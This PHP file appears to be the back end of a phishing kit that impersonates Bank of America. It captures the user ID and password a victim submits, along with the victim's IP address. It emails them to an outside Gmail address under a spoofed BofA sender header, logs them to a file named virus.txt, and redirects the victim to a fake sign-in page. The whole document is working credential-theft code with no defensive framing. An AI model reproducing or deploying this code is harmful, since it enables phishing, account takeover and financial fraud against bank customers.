<?php
$ip = getenv("REMOTE_ADDR");
$message .= "--------------USERS----------\n";
$message .= "Userid: ".$_POST['myuser']."\n";
$message .= "Password: ".$_POST['mepas']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Cre-------------\n";
$send = "100fareedah@gmail.com";
$subject = "My Fresh BofA - $ip";
$headers = "From: BofA<support@mymoney.net>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$fp = fopen("virus.txt","a");
fputs($fp,$message);
fclose($fp);
header("Location: index2.html?signinpage&update=/&cookiecheck=yes&destination=nba/signin&accountopening/ApplicationStartup/Application$update=&cookiecheck/yes&destinpage&update");

	 
?>